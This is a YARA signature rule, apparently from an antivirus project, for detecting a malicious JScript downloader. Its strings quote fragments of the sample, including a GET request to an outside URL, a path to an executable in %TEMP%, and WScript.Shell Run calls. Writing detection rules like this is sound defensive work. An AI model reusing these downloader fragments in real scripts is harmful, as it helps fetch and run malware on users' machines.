rule sig_20160329_88a2b1f92a35f69143a68e3d691b5247 {
  meta:
    description = "datamaliciousorder - file 20160329_88a2b1f92a35f69143a68e3d691b5247.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "fe5a89f214cc703da1cc8a3a957cdf8184a879db8cc21a5d69ade70afe1f97fb"

  strings:
    $s1  = "R[RC](\"GET\", \"http://aztechnologies.co.uk/sdj3oa\", false);" fullword ascii
    $s2  = "function E() {return l0[\"ExpandEnvironmentStrings\"](\"%TE\"+\"MP%/\") + \"5KHyECYUNtbTRvo.exe\";};" fullword ascii
    $s3  = "for (;;){WScript[G](J() * 11); if (R[\"readystate\"] >= 2 * 2) break;};" fullword ascii
    $s4  = "function z0(Aw, V){ht = ht * 1; return Aw - V;};" fullword ascii
    $s5  = "var l0 = function pJ() {return WScript[W](\"WScript.Shell\");}(), m = 11;" fullword ascii
    $s6  = "function Qc(){return \"\" + a;};" fullword ascii
    $s7  = "function e() {return ((H == true) && (H == q)) ? 1 : ht;};" fullword ascii
    $s8  = "function MC(NG){l0[\"Run\"](NG, ht, ht);};" fullword ascii
    $s9  = "function J(){return 22;};" fullword ascii
    $s10 = "function wp()" fullword ascii
    $s11 = "function B(){return W;};" fullword ascii
    $s12 = "var Fm = new this[\"Date\"]();" fullword ascii
    $s13 = " while (Eg){" fullword ascii
    $s14 = "function z(J0) {var Iq = (1, 2, 3, 4, 5, J0); return Iq;};" fullword ascii
    $s15 = "return z0(YK, Fg);" fullword ascii
    $s16 = "var q = false;" fullword ascii
    $s17 = "q = true; " fullword ascii
    $s18 = "H = true; " fullword ascii
    $s19 = "var H = false;" fullword ascii
    $s20 = "var eg = false;" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}